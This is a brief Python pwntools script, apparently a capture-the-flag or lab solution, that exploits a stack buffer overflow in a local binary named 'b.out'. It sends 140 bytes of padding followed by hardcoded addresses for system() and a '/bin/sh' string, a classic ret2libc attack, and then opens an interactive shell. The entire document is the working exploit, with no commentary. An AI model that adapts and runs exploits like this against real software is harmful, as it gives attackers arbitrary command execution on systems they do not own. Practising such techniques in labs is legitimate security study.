from pwn import *

io = process('./b.out')

ret = 0xdeadbeef
system_addr = 0xf7e3dda0
binsh_addr = 0xf7f5ea0b
payload = "A" * 140 + p32(system_addr) + p32(ret) + p32(binsh_addr)

io.send(payload)
io.interactive()
